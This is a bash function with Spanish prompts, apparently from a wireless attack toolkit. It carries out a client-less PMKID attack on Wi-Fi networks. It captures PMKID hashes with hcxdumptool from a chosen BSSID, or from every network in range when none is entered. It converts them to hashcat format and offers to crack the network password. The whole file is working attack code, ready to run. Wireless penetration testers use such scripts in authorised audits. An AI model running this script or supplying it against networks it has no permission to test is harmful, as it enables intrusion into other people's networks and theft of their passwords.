#!/bin/bash

function pmkid_attack() {
    banner
    ensure_mon_interface
    
    echo -e "${YELLOW}[*] Ataque PMKID (Client-less)${NC}"
    
    start_scan_and_selection "airodump"
    if [ $? -eq 0 ]; then
        target_bssid="$TARGET_BSSID"
    else
        read -p "Ingresa el BSSID del objetivo (o vacío para TODO): " target_bssid
    fi

    read -p "Tiempo de captura en segundos (ej. 60): " capture_time
    dump_file="$WORK_DIR/pmkid_capture_$(date +%s).pcapng"
    
    echo -e "${YELLOW}[*] Capturando PMKID...${NC}"
    
    F_OPT=""
    if [ ! -z "$target_bssid" ]; then
        echo "$target_bssid" | sed 's/://g' > filter.txt
        F_OPT="--filterlist_ap=filter.txt --enable_status=1"
    fi
    
    timeout "$capture_time" hcxdumptool -i "$mon_interface" -w "$dump_file" $F_OPT
    
    echo -e "\n${GREEN}[+] Captura finalizada.${NC}"
    
    if [ -f "$dump_file" ]; then
        hcxpcapngtool -o "${dump_file}.hc22000" "$dump_file"
        
        if [ -f "${dump_file}.hc22000" ]; then
            echo -e "${GREEN}[!!!] Hashes PMKID extraídos.${NC}"
            read -p "¿Crackear ahora? (s/n): " crack_now
            if [[ "$crack_now" == "s" || "$crack_now" == "S" ]]; then
                 crack_password_auto "${dump_file}.hc22000" "PMKID"
            fi
        else
            echo -e "${RED}[!] No se encontraron PMKIDs.${NC}"
        fi
    else
        echo -e "${RED}[!] Error en captura.${NC}"
    fi
    
    read -p "Presiona Enter para continuar..."
}
